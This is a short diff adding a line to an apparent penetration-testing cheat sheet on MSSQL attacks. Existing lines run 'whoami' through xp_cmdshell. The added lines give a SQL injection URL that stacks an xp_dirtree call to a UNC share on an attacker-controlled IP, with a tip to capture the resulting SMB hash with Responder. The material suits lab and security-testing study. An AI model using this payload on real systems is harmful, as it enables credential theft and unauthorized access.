@@ -165,6 +165,9 @@ RECONFIGURE
 # Quickly check what the service account is via xp_cmdshell
 EXEC master..xp_cmdshell 'whoami'
 
+# SQLi through web URL for SMB hash connection. Listen with responder
+http://<IP>/test?test=1; EXEC master ..xp_dirtree '\\10.10.15.237\test'; --
+
 ```
 ### SMTP
 ```bash
